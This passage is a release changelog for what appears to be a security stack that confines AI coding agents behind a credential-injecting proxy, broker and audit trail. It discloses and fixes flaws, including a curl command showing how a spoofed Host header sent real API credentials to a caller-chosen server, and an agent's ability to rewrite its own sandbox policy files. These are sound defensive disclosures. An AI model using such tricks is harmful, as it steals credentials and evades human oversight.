hardcoded raw-credential path list in the lint (now derived from the
manifests), the hardcoded `AUDIT_MIN` constant (now the highest `min_stack`
among the entries an example vendors), and the per-provider prose in
`PLAYBOOK.md` that duplicated manifest data.

`check-drift.sh` now resolves `NNN_<name>.<ext>` to its bank entry by name,
before falling back to guessing which example a deployment started from. That
guess degrades on a deployment carrying many custom files; a bank file resolves
the same regardless of what sits beside it.

**`scripts/check-invariants.sh` — is your own code safe, not just current?**
`check-drift.sh` answers one question: does your copy match ours. For a file
you wrote there is no ours, so it answers `custom` and diffs nothing. A
deployment maintainer reconciled everything it reported, got a clean run, and
had two of their own addons writing secrets into the audit trail throughout.

The checks now live in `scripts/lib/invariants.sh`, shared between the upstream
lint and this scanner so the two cannot drift. The scanner needs no upstream,
no pin, no provenance stub, no network and no git. `check-drift.sh` invokes it,
so neither question can be asked without the other; `SKIP_INVARIANTS=1` opts
out.

A findings-free scan is deliberately **not** reported as a pass. These are
greps against a known list, and a provider can be unsafe in ways none of them
anticipate.

**The audit trail is scanned for tainted credentials at runtime.** The static
checks find the two ways we know of to write a secret into the trail; they have
no theory of what is sensitive. `35-audit-leak.test.sh` taints every channel a
secret can arrive on, drives real traffic through all four shipped addons, and
scans the trail for the taints — so it does not need to know how a leak would
be spelled.

### Upgrading

Two of these need action. Both are one-time.

**1. The rename.** Renaming a compose service and network means an existing
deployment keeps an orphaned `dev` container and network unless it is brought
down first:

```bash
docker compose down          # before pulling the new compose
docker compose up -d
```

If you copied `devcontainer.json`, its `"service": "dev"` is now stale — change
it to `"lab"`. Nothing pinned breaks: both examples build their lab image from
their own `./lab`, and old tags keep resolving.

**2. Unmediated egress is now reported.** A deployment whose `lab` network has
no `internal:` key — which is every deployment predating this release — will
start seeing a finding on each `check-drift.sh` run:

```
FAIL   lab network has no `internal:` key — egress is unmediated
```

That is the intended behaviour, not a false positive: the control was absent
before and nothing said so. Add `internal: ${LAB_INTERNAL:-true}` to the `lab`
network to fix it, and expect anything in the lab that cannot use an HTTP proxy
to stop working — that is the control taking effect. `LAB_INTERNAL=false` keeps
the old behaviour and keeps the finding.

Nothing forces you to adopt `bank/`. Existing hand-maintained provider files
keep working; `check-drift.sh` resolves them against the bank when the names
match and falls back to the example when they do not.

---

## 1.4.3 — 2026-07-30

### Fixed

**All three injection addons forwarded the agent's own credential when the
broker was unreachable.** Each one states that it replaces whatever the client
sent. None of them did on the failure path, because stripping and injecting
were the same statement:

```python
flow.request.headers["Authorization"] = f"token {_get_token()}"   # before
```

`_get_token()` raises when the broker cannot be reached, so neither half runs —
not the injection, and not the strip. `020_anthropic.py` reached the same end
by a different route: its fetch sat ahead of the strip loop, so the loop never
ran either. Verified against the real addons with no broker reachable, the
vendor received the client's header verbatim:

```
GOT auth=[token CLIENT-OWN-TOKEN-abc123]
```

Same for Anthropic's `x-api-key` and `Authorization`, and Cloudflare's bearer
token.

Scoped honestly: **not a credential leak.** Nothing of ours escapes, and the
agent would need a token it already holds. What breaks is a property the stack
states — that the proxy replaces client-supplied auth — so a dev container
carrying its own credential could reach the vendor with it any time the broker
was down.

The fix is ordering, not error handling: strip unconditionally as its own
statement, then fetch, then inject. **Fail mode is deliberately unchanged** —
the request still goes out unauthenticated and the vendor still 401s, which is
a signal the agent can act on. Making that configurable (`injection.fail_mode`)
is design work rather than a patch.

**`PLAYBOOK.md` carried the vulnerable ordering in prose** — "fetch a token
from the broker route added above, inject it, strip whatever the client sent".
The same copy-source failure as 1.4.2's Telegram snippet, one release later:
the instructions for writing an addon described the bug, so a provider written
by following them inherited it. Reordered, with the reason attached.

New coverage in `tests/integration/25-proxy-injection.test.sh`. It has to run
last and build its own proxy — the addons cache for five minutes, so a proxy
that already injected successfully serves from cache, never reaches the broker,
and leaves the failure path untested.

**Upgrading:** nothing in `stack/` changed and no image moved. The changed
files are `examples/*/proxy/*.py` and `PLAYBOOK.md`, which repinning does not
deliver — the same bind-mount split 1.4.0 is about. If your deployment vendored
these addons, apply the reorder to your own copies: the strip must be its own
statement, and it must come before the broker fetch.

---

## 1.4.2 — 2026-07-29

### Fixed

**`PLAYBOOK.md`'s Telegram snippet built the leak it warns about.** The
"What is safe to log" section states in bold that `flow.request.path`
includes the query string, and the code block directly under it then split
the raw path on `/`:

```python
api_method = flow.request.path.split("/")[2]     # before
```

On `/bot<TOKEN>/sendMessage?chat_id=…&text=…` that returns the whole of
`sendMessage?chat_id=…&text=…` — the recipient and the message body, written
into the audit trail as if it were a method name, and served over HTTP by
`observer`. The bot token is in segment 1 and never appeared, which is
precisely what let the snippet read as safe: the comment above it says
"never log the path itself", and it doesn't.

Shipped as the recommended Telegram pattern from 1.2.0 through 1.4.1. The
snippet now strips the query string before splitting and indexes
defensively — an addon that raises on a malformed path takes the request
down with it, and a short path is what a prober sends.

Reported by a deployment maintainer whose own Telegram addon had followed
it. Found while reconciling for 1.4.0 — the release about not logging raw
paths, which could not tell them, because `check-drift.sh` correctly reports
a custom addon as `custom` and diffs nothing. That structural gap is
[#26](https://github.com/lpezet/secure-agent-lab/issues/26), for 1.5.0.

### Added

**A static check for `pretty_host`, the invariant that had none.** "Never
use `flow.request.pretty_host` for a security decision" is the first
non-obvious invariant in `CLAUDE.md`, with a real regression behind it —
every addon originally matched `pretty_host`, so a spoofed `Host` header
collected a real injected credential. Its only coverage was runtime
(`tests/integration/20`, `25`, `30`), which is exactly what a deployment
cannot run against its own addons.

`000_policy.py` is exempt and is the only file that is: it ORs `pretty_host`
with the real host to *widen* a block, and trusting a claimed `Host` to deny
more is safe where trusting it to permit is not. The exemption is positional
rather than semantic, since that file is copied verbatim and
`check-drift.sh` already enforces that it matches.

**Upgrading:** nothing in `stack/` changed and no image moved. If you wrote
a custom addon by following the playbook's Telegram pattern, check it —
`split("?", 1)[0]` before any `split("/")`. Both new checks run as part of
`tests/run.sh`; making them runnable against a deployment's own files is
[#26](https://github.com/lpezet/secure-agent-lab/issues/26).

---

## 1.4.1 — 2026-07-29

### Fixed

**`cred-gateway/github.conf` pointed at directories no deployment has.** Both
examples opened with "Counterpart to `addons/010_github.py` and
`providers/github.js`" — those are the *container-side* mount targets, not
the directory names in a generated stack, which are `proxy/` and `broker/`
per the one-directory-per-service layout the rest of the repo uses. Anyone
following the comment went looking for directories that aren't there.

**`broker/anthropic.js` returned `""` for an empty credential file.** No call
site changes behaviour — `""` is falsy, so an empty auth-token file already
fell through to the API key — so this is contract hygiene rather than a bug
fix: `tryReadFile` reads as "the value, or null", and that stops being true
the day a caller tests `!== null`. It now returns `null`. Also picked up a
note on why the read is deliberately uncached (local file read; rotating the
credential needs no broker restart).

Both were found by running 1.4.0's own `scripts/check-drift.sh` against a
live deployment for the first time — the drift it reported in these two
files turned out to be ours, not the deployment's.

**Upgrading:** these are `examples/` files, so repinning does not deliver
them — the same bind-mount split 1.4.0 is about. Nothing here affects the
security boundary or runtime behaviour, so there's no urgency, but if you
are reconciling for 1.4.0 anyway, pin to `v1.4.1` and take both in one pass:

```bash
scripts/check-drift.sh --to v1.4.1 /path/to/deployment
```

---

## 1.4.0 — 2026-07-29

### Added

**`scripts/check-drift.sh` — 1.3.1's reconciliation step, automated.** 1.3.1
put the bind-mount trap at the centre of "Upgrading" but left the diff as a
manual walk across three directories with a different resolution rule per
file. This runs it. It reads the deployment's own pin from `compose.yaml`
and its provenance from the stub `CLAUDE.md`, resolves each bind-mounted
file against the right upstream counterpart, and reports `DRIFT`, `MISSING`
or `custom`:

```bash
scripts/check-drift.sh --to v1.4.0 /path/to/deployment
scripts/check-drift.sh --to v1.4.0 --show-diff /path/to/deployment
```

Needs only bash, git and diff, and exits non-zero on drift or an absent
`000_policy.py`, so it doubles as a pre-upgrade CI gate. The counterpart
resolution is the part worth having a tool for: most files compare against
`examples/`, but `000_policy.py` and `001_allowlist.py` compare against
`stack/proxy/addons/`, because the proxy image ships no addons at all and a
policy addon that was never vendored is a *missing* control rather than a
stale one. Custom providers are reported as `custom` and don't fail the run
— they have nothing upstream to drift from. Covered by
`tests/integration/05-check-drift`, which needs no docker.

### Changed

**The broker records its failures, not just its successes.**
`stack/broker/server.js` emitted audit events only from the paths that
worked: an unroutable request or a handler that threw left nothing in the
trail, which during an incident reads as "never happened" rather than
"happened, and failed". It now emits `route_not_found` and `request_failed`.

Both are deliberately terse about anything the caller supplied. A 404 names
the provider *namespace*, and only when it matches one this server actually
registered — never the requested path. A provider that carries its
credential in the URL (Telegram's `/bot<TOKEN>/<method>`) would otherwise
write a live secret into a file `observer` publishes over HTTP, and
truncating to N segments cannot help, since the secret is as likely to be in
the first segment as any other. A failure is named by `err.code` or
`err.name`, never `err.message` — providers build those from vendor response
bodies. Full detail still goes to stdout, which `observer` does not read.

The 500 response body is now a flat `{"error":"internal error"}` for the
same reason. That is the only externally visible behaviour change in this
release; nothing in the stack parses that body.

**Addons log a parsed endpoint instead of the raw request path.** The
shipped `020_anthropic.py` and `030_cloudflare.py` recorded
`flow.request.path` directly. Two problems: **mitmproxy's
`flow.request.path` includes the query string**, so "I only logged the path"
was never the guarantee it sounded like, and a path that is safe today
starts carrying an id or a token the moment the provider adds an endpoint.
Both now parse an endpoint — query string dropped, then the leading
segments, sized per provider (two for Anthropic, three for Cloudflare, whose
paths carry an account id deeper in) — so the trail records `/v1/messages`
rather than `/v1/messages/batches/<id>?beta=…`. Which slice is safe is
exactly what differs between providers, so there is no shared helper for it
in `audit.py`. The `/v1/organizations` policy check still tests the real
path; only the logging changed.

**`examples/dev-container` repinned to 1.3.1 and moved to
`/anthropic/cred`.** It was still pinned at v1.1.0 and carrying the older
single `/anthropic/key` route with `x-api-key` injection, which silently
drops a Claude subscription's OAuth token to API-key billing and rate
limits. It now matches `examples/claude-code`: `/anthropic/cred` returning
`{type, value}`, preferring `ANTHROPIC_AUTH_TOKEN_PATH` over
`ANTHROPIC_API_KEY_PATH`. Providing an OAuth token is now a file drop plus
the new `ANTHROPIC_AUTH_TOKEN_PATH` line in `compose.yaml`.

**`PLAYBOOK.md`: the audit trail's leak risk is located at `observer`.** The
guidance had grown into prescribing how a provider should handle its own
exceptions, which is below this project's layer. It now states the property
instead: the images contribute no audit events, so every line in the trail
was written by a provider or addon file the *deployment* owns, and
`observer` publishes whatever that is over HTTP. It is the one service whose
safety is inherited rather than supplied — which is what makes "log values
you chose yourself" a boundary rule and not a style preference. Same note
added to `CLAUDE.md`'s `observer` section, which read as an unqualified
"holds no credentials".

**Upgrading:** the two halves come apart in this release, so both steps
matter.

*Images:* `stack/broker/server.js` changed, so repinning and rebuilding gets
you the broker's failure logging — `build --pull`, then `up -d
--force-recreate`, then `docker compose images` to confirm the tag actually
moved.

*Bind-mounts:* the addon and provider changes above are in `examples/`,
which means they are **not** delivered by repinning. If your deployment was
generated from either example, reconcile:

```bash
scripts/check-drift.sh --to v1.4.0 /path/to/deployment
```

Nothing here is a security regression if you skip it — the raw-path logging
is a hazard that depends on your provider, and the Anthropic route change is
a billing-tier issue rather than a boundary one. But this is the first
release whose own contents demonstrate the trap the tool exists for, so it
is worth running once even if you believe you are clean.

---

## 1.3.1 — 2026-07-28

### Added

**`LICENSE` — MIT.** The repo had shipped without one, which left anyone
vendoring `stack/` or `examples/` into their own project with no stated
terms. No functional change.

### Changed

**`PLAYBOOK.md` now covers maintenance, not just generation.** The file
landed in 1.2.0 written almost entirely for the generate-a-new-stack case;
"Upgrading" was three lines. Most real use of a deployment is the other
thing. Rewritten after two rounds of review from an agent maintaining a live
deployment of this stack:

- **The bind-mount trap is now the first thing "Upgrading" says.** A
  deployment is versioned in two halves and only one moves when you repin:
  `compose.yaml` builds each image from `stack/<service>` at the tag, but the
  files that enforce the boundary (`proxy/*.py`, `broker/*.js`,
  `cred-gateway/*.conf`) are bind-mounted from the deployment's own
  directories. Bumping the tag upgrades the images and leaves those files
  untouched. That warning previously existed only in this file's 0.1.0 →
  1.0.0 entry, so an upgrade that didn't cross that boundary never saw it —
  which is how a real deployment ended up running post-1.0.0 images beside
  pre-1.0.0 `pretty_host` addons. "Upgrading" is now a six-step procedure
  with the reconciliation diff as its centre.
- **`restart` no longer appears as the way to apply an upgrade.** Neither
  `docker compose restart` nor a bare `up -d` rebuilds — the image is tagged
  `<project>-<service>` and already exists, and Compose builds only when one
  is missing. A changed git-URL tag in `build:` on its own gets you the old
  image in a freshly recreated container. The step is now `build --pull`,
  `up -d --force-recreate`, `docker compose images`.
- **Anthropic: the credential-type-aware shape is documented.** The section
  described `examples/dev-container`'s older `/anthropic/key` + `x-api-key`
  route, so a Claude Code deployment following it literally injected an API
  key over a subscription OAuth token — no error, just a silent drop to
  API-key rate limits and billing. `/anthropic/cred` returning `{type,
  value}` and preferring `ANTHROPIC_AUTH_TOKEN_PATH` has shipped in
  `examples/claude-code` since 1.2.0; only the playbook was stale.
- **Provenance is recorded at generation time.** The stub `CLAUDE.md` now
  carries the pin, which `examples/` directory the deployment was generated
  from, the tag each bind-mounted directory was last reconciled against, and
  the custom files that have no upstream counterpart. Without the first two
  the reconciliation diff can't be run at all; the third makes a skipped
  reconciliation visible instead of silently inheriting a new pin.
- **Audit logging gained the rules that make it safe and complete**: never
  log headers, bodies or query strings, and never log a path for a provider
  that carries its credential in the URL (Telegram's `/bot<TOKEN>/<method>`)
  — parse an identifier instead; log refusals and failures, not just
  successes; and `audit.js`/`audit.py` are libraries, so a custom provider
  that calls neither is invisible while the dashboard looks complete.
- **Also**: the egress allowlist is documented as an opt-in feature rather
  than mentioned in passing; `observer`'s published port is env-indirect so
  two stacks can share a host; a live spoofed-`Host` check against the broker
  replaces the claim that verifying it needed more setup than it was worth;
  and custom providers now come with an explicit statement that you own them
  permanently and no upstream fix will reach them.

**Upgrading:** nothing in `stack/` changed — no image, addon, provider or
gateway file moved, and the security boundary is identical to 1.3.0.
Repinning is enough.

If your deployment has been repinned at any point *without* reconciling its
bind-mounted files against the tag, run the new "Upgrading" procedure once
against your current pin before moving on. That is the case this release
exists to make routine, and a deployment in it has no symptom to notice.

---

## 1.3.0 — 2026-07-26

### Changed

**Repo renamed: `secure-autonomous-agents` → `secure-agent-lab`.** No code or
security-boundary changes — purely a rename, done directly on GitHub. Every reference is
updated: this repo's own build URLs (`examples/*/compose.yaml`), `PLAYBOOK.md`'s stack name
and pinned-tag fetch URL, the README title, and the `tests/integration/00-config-lint.test.sh`
regexes that parse those build URLs.

**Upgrading:** update your local git remote —

```bash
git remote set-url origin git@github.com:lpezet/secure-agent-lab.git
```

GitHub redirects the old URL for now, but don't rely on that indefinitely. If your own
deployment's `compose.yaml` builds `stack/*` from this repo's git URL directly, point it at
`secure-agent-lab.git#vX.Y.Z` on your next repin.

### Added

**`examples/claude-code` repinned from `v1.0.0` to `v1.2.0`.** No `stack/` security behavior
changed in that range — `v1.0.0` already carries the `1.0.0` security fixes, and everything
since is the audit-logging feature added in `1.1.0`. This example's own `broker`/`proxy` files
now call the audit helpers (`require("../audit")`/`import audit`), as required once pinned
that high. Unlike `dev-container`, it deliberately does not wire up the `audit-logs` volume or
the `observer`/`log-rotator` services — the calls are no-ops here by design (documented as
safe in `CLAUDE.md`). See `examples/claude-code/README.md`'s new "Audit logging" section for
how to add the live dashboard if you want it.

No upgrade steps for this part: additive only, and the calls are no-ops without `AUDIT_LOG`
set.

---

## 1.2.0 — 2026-07-26

### Added

**`PLAYBOOK.md`: the end-user-facing entry point for deploying and extending the stack.**
`CLAUDE.md` had accumulated both maintainer-only content (how this repo's own services are
built, tested, and released) and end-user content (how to generate a deployment, add a
credential provider, upgrade between versions) in one file scoped to developing this repo.
That end-user-facing material — generation constraints, the Known Providers reference, and
"Adding a credential provider to an existing stack" — now lives in `PLAYBOOK.md` instead.
`CLAUDE.md`'s overlapping invariants and provider section are trimmed to point there, keeping
only the maintainer-only bits (how `stack/`'s own services are wired, tested, and released).

No upgrade steps: this is a documentation reorganization with no code changes.

---

## 1.1.3 — 2026-07-26

### Fixed

**`examples/claude-code`'s Anthropic credential no longer lives in `.env`.** It previously held
a literal `ANTHROPIC_API_KEY` (or `ANTHROPIC_AUTH_TOKEN`) value — the only secret in either
example that wasn't a file under `~/.config/agent-creds/`, inconsistent with the GitHub App
private key sitting right next to it in the same directory, and an easy file to accidentally
`cat`, commit, or share. The broker now reads `ANTHROPIC_API_KEY_PATH` /
`ANTHROPIC_AUTH_TOKEN_PATH`, the same convention `GITHUB_APP_PRIVATE_KEY_PATH` already used.
`tests/e2e` mounts this example's broker directly, so its `compose.yaml`, `.env.example`,
`run.sh` preflight check, and README are updated to match.

**Upgrading:** move the value out of `.env` into a file, then delete the line:

```bash
printf '<your-key>' > ~/.config/agent-creds/anthropic.key   # or anthropic-auth.token for an OAuth token
chmod 600 ~/.config/agent-creds/anthropic.key
```

Remove `ANTHROPIC_API_KEY=`/`ANTHROPIC_AUTH_TOKEN=` from `examples/claude-code/.env`, then:

```bash
docker compose up -d --force-recreate broker proxy    # proxy restart needed — it caches the key for 5 min
```

---

## 1.1.2 — 2026-07-26

### Added

**Documented the release-branch process in `CLAUDE.md`.** No code changes. Writes down the
process used for `1.1.0` through this release: every release branch cuts from `main`, both the
next patch and next minor branches get cut immediately after each tag, and — the step that
keeps them from silently diverging — `main` gets merged into every other still-open release
branch right after a release ships.

No upgrade steps.

---

## 1.1.1 — 2026-07-26

### Added

**`examples/dev-container` now has the audit-log dashboard.** Repinned `broker`/`proxy`/
`cred-gateway` from `#v1.0.0` to `#v1.1.0` and added `observer`/`log-rotator`, same as
`stack/compose.yaml`. This example's own provider/addon files now call `logEvent`/
`audit.log_event` too, so real events (token issuance, injected credentials, policy blocks)
show up in the dashboard, not just cred-gateway's request log. VS Code forwards the dashboard
port automatically, labeled "Audit log dashboard" in the Ports tab.

`examples/claude-code` is unaffected — still on `v1.0.0`, to be repinned in a later release.

No upgrade steps: existing `examples/dev-container` deployments pick this up on their next
`docker compose up --build`, and every new env var/volume mount is additive.

---

## 1.1.0 — 2026-07-26

### Added

**Audit logging: `observer` and `log-rotator`.** `broker`, `proxy`, and `cred-gateway` now
write a structured, secret-free JSONL trail — what got injected, blocked, or issued, never a
credential value — to a shared `audit-logs` volume. `observer` tails it and serves a live view
at `http://localhost:9000` (loopback-only, with no `secure`/`dev` network membership of its
own — Docker volumes aren't network-scoped, so it reaches the trail without joining either).
`log-rotator` rotates the files daily via `logrotate` (`copytruncate`, 14-day retention, a
`maxsize` safety net) and self-heals the shared volume's permissions on every start, since
`broker` (`node`) and `proxy` (`mitmproxy`) are different non-root uids writing into one
directory.

Available today in `stack/compose.yaml` — see `stack/CLAUDE.md` for a smoke-test walkthrough
that needs no real credentials. Not yet wired into `examples/` in this release.

No upgrade steps: every new environment variable and volume mount is additive and a no-op if
absent, and nothing about the existing security boundary changed.

---

## 1.0.0 — 2026-07-22

### Security

**Fixed: a spoofed `Host` header made the proxy send credentials to any server
of the caller's choosing.** Every addon matched `flow.request.pretty_host`,
which prefers the client-supplied `Host` header, while mitmproxy actually
connects to `flow.request.host` (absolute-form URI, CONNECT authority, or TLS
SNI). From inside the dev container:

```bash
curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/v1/messages
```

The addon believed the request was bound for Anthropic, fetched the real API
key from the broker, and injected it into a request delivered to `my-server`.
The same trick worked against `000_policy.py`, so `-H 'Host: anything'` reached
`broker:8080/github/token` — the proxy is the only component bridging the `dev`
and `secure` networks, so network isolation does not cover that path. It also
defeated `001_allowlist.py` egress control outright.

Three credential types were exposed: the Anthropic API key or auth token,
GitHub App installation tokens, and scoped Cloudflare tokens. Nothing in the
logs looks unusual — the proxy records an ordinary `server connect`.

All addons now match `flow.request.host`. `000_policy.py` additionally checks
the claimed host, so a request merely *labelled* internal is refused too.

> **Rotate your credentials as part of this upgrade.** Treat any secret that
> was reachable through a 0.1.0 proxy as disclosed unless you are certain no
> untrusted code ran in the dev container. Absence of evidence is not evidence
> here — a successful exfiltration leaves no distinctive trace.

**Fixed: the dev container could rewrite the stack's own configuration**
(`examples/dev-container`). That example mounts `../` — the parent of
`.devcontainer` — read-write at `/workspace`, so the agent could edit
`proxy/`, `broker/`, `cred-gateway/` and `compose.yaml`: neuter the policy
addon, add a prefix-match location exposing `/github/token`, or point a
provider at a host it controls. It could not restart the containers itself, but
the edit persisted and took effect the next time a human did. A nested
read-only bind now shadows `.devcontainer` while the project stays writable.

**Fixed: an inline comment in the proxy allowlist disabled the domain it was
written on.** `api.example.com  # read only` parsed `# read only` as the method
list, so every method was blocked. Fail-closed, but silent — the domain simply
stopped working. Comments are now stripped before parsing.

### Changed

**`cred-gateway` ships no provider endpoints.** The base image previously baked
in `/github/credential` and `/github/identity`. It now serves `/healthz`,
`include /etc/nginx/gateway.d/*.conf`, then `location / { return 403; }` — so
out of the box it denies everything. Endpoints come from a bind-mounted
directory of snippets, the same convention the broker already used for
`/app/providers` and the proxy for `/addons`: the base image is mechanism, the
deployment supplies content. This is what lets you add endpoints for your own
providers without forking the image.

**`examples/claude-code` runs the dev container as `agent`, not `root`.** The
`ubuntu` user is renamed to `agent`, `HOME` becomes `/home/agent`, and Claude
Code installs under that user. The persisted-state mounts move to match
(`/root/.claude` → `/home/agent/.claude`, and likewise `.claude.json` and
`.config`) — `tests/integration/00-config-lint` now checks those targets
against the image's `HOME`, since a mismatch loses settings silently rather
than failing.

**`CLAUDE_VERSION` build arg** in the same example pins or refreshes the Claude
Code install without busting the apt/node/bun layers.

**Both examples are laid out one directory per service:**

```
addons/     *.py    →  proxy/         mounted at /addons
providers/  *.js    →  broker/        mounted at /app/providers
gateway.d/  *.conf  →  cred-gateway/  mounted at /etc/nginx/gateway.d
dev/                   (unchanged)
```

Contents are untouched — this is purely a move. Previously you had to know that
addons are a mitmproxy concept and providers a broker one to work out which
directory fed which service; now the directory is named after the service and
holds nothing but the files that service loads.

Nothing breaks for an existing deployment: you own your `compose.yaml` and it
keeps pointing wherever it already points. It matters only when you re-copy
from an example or follow the docs, which now use the new paths.

**Example builds are pinned to `#v1.0.0`** instead of `#main`. Tracking a
branch meant `docker compose build` silently picked up whatever landed on main
later, while the bind-mounted addons stayed frozen at whatever you copied —
the image moving while the security-relevant files do not is precisely the
split step 1 below warns about. `tests/integration/00-config-lint` now fails
if an example points at a branch.

### Added

- **`tests/`** — two tiers behind a `tests/run.sh` facade.
  `tests/integration/` covers the security boundaries against stubs: no
  credentials, free, ~60s, 144 assertions. `tests/e2e/` covers what a stub
  cannot reach (HTTPS/CONNECT, the CA cert lifecycle, `git push` through the
  credential helper) using a dedicated GitHub App, and skips cleanly when it is
  not configured. A bare `tests/run.sh` never runs e2e.
- **`stack/cred-gateway/gateway.d/README.md`** and
  **`stack/broker/providers/README.md`** — authoring rules for the two content
  seams, and an explicit statement that both directories are empty by design.
- Reference `cred-gateway/github.conf` vendored into both examples.
- `stack/compose.yaml` now says up front that it is a reference skeleton with
  empty provider and gateway mounts, so it will not serve credentials as-is.
  It never did; it just did not say so.
- Both examples ship a commented-out allowlist mount, and the README's egress
  section is rewritten. It previously told you to copy `allowlist.sample` — a
  plain list of domains — to `001_allowlist.py`, and to uncomment a volume
  neither example had. Following it put a data file where the proxy globs
  `*.py`.

---

## Upgrading from 0.1.0

Roughly 20 minutes, most of it waiting on rebuilds. Steps 1–3 are required for
anyone; 4 and 5 depend on which example you run.

### 0. Rotate credentials

See the security note above. Do this first — the rest of the upgrade is
pointless if a disclosed key is still live.

- Anthropic: issue a new API key or auth token, revoke the old one.
- GitHub: generate a new App private key, delete the old one. Installation
  tokens expire on their own within an hour.
- Cloudflare: roll the minter token.

### 1. Update your vendored addons — `docker compose pull` will not do it

This is the step that is easy to miss. The addons are **bind-mounted from your
deployment directory**, not baked into the proxy image, so rebuilding or
repulling the image leaves the vulnerable files exactly where they are.

Copy the fixed addons over your own:

```bash
# from a fresh checkout of this repo at v1.0.0.
# Note the source path: examples moved to one directory per service in 1.0.0,
# so addons now live directly in proxy/. Your own deployment can keep whatever
# layout it already has — only the source of the copy changed.
cp examples/claude-code/proxy/*.py /path/to/your/deployment/addons/
```

If you have written your own addons, the fix is one line each — every host
comparison must use `flow.request.host`:

```python
# WRONG — the caller controls this
if flow.request.pretty_host == "api.example.com":

# RIGHT — this is where mitmproxy actually connects
if flow.request.host == "api.example.com":
```

Verify with the regression suite, which fails against the old code:

```bash
tests/run.sh 20 25 30
```

### 2. Add the `gateway.d` mount, or git stops working

The new `cred-gateway` image denies everything it is not explicitly given. If
you upgrade the image without mounting snippets, `/github/credential` and
`/github/identity` start returning **403**, the git credential helper returns
nothing, and pushes fail with an authentication error that does not mention
nginx anywhere.

Create the directory next to your `compose.yaml` and copy the reference
snippet. The path is yours to choose — this matches the one-directory-per-
service layout the examples now use, so your tree stays comparable to them:

```bash
mkdir -p cred-gateway
cp /path/to/repo/examples/claude-code/cred-gateway/github.conf cred-gateway/
```

Add the mount to the `cred-gateway` service:

```yaml
  cred-gateway:
    volumes:
      - ./cred-gateway:/etc/nginx/gateway.d:ro
```

Two rules when writing your own snippets — both are checked by
`tests/integration/00-config-lint`:

- **Exact matches only.** `location = /github/credential`. A prefix match like
  `location /github/` also exposes `/github/token`, which hands the dev
  container a raw installation token.
- **The host path must be invisible to the dev container.** If your snippets
  live inside whatever is mounted at `/workspace`, the agent can widen its own
  whitelist and wait for a restart.

Full rules in `stack/cred-gateway/gateway.d/README.md`.

### 3. Re-check your allowlist

If you use `001_allowlist.py` and any line carried a trailing comment, that
domain was blocked entirely in 0.1.0 regardless of what you intended. Those
lines now work as written — which means **traffic that was being denied will
start flowing**. Read the file once and confirm each entry is what you actually
want to permit:

```
api.example.com                 # was: blocked. now: GET, HEAD, OPTIONS
upload.example.com PUT,POST     # unchanged
```

### 4. `examples/dev-container` — add the shadow mount

```yaml
  dev:
    volumes:
      - ../:/workspace:cached
      - ../.devcontainer:/workspace/.devcontainer:ro   # add this
      - proxy-certs:/proxy-certs:ro
```

Nested mounts win over their parent, so this makes the stack config read-only
to the agent while the project stays writable. Rebuild the container for it to
take effect. Confirm with:

```bash
tests/run.sh 50
```

### 5. `examples/claude-code` — fix ownership of the persisted state

The dev container no longer runs as root, so the files under `./workspace/`
created by 0.1.0 are owned by a user that no longer writes them:

```bash
docker compose build --no-cache dev
docker compose up -d --force-recreate dev

# `agent` is `ubuntu` renamed, so it keeps uid/gid 1000 from ubuntu:24.04.
# Confirm before chowning — the wrong id is worse than no chown at all.
docker compose exec dev id agent      # expect uid=1000(agent) gid=1000(agent)
sudo chown -R 1000:1000 examples/claude-code/workspace/
```

The mount targets moved with it — `/root/.claude` → `/home/agent/.claude`, and
likewise for `.claude.json` and `.config`. If you are carrying a modified
`compose.yaml`, make the same change: left at `/root/`, the bind mounts land
somewhere Claude Code never reads, and settings and auth state silently vanish
on every recreate.

### 6. Verify the boundary end to end

```bash
tests/run.sh                       # the whole integration tier
```

Then, inside a running dev container:

```bash
/path/to/stack/scripts/smoke-test.sh
```

The checks that matter: the broker must be unreachable both directly and
through the proxy, and `/github/token`, `/anthropic/key` and `/cloudflare/token`
must all return 403 from the gateway.

---

## 0.1.0

Initial release. Broker, mitmproxy-based credential injection, nginx
cred-gateway with baked-in GitHub endpoints, two-network isolation, and the
`dev-container` and `claude-code` examples.
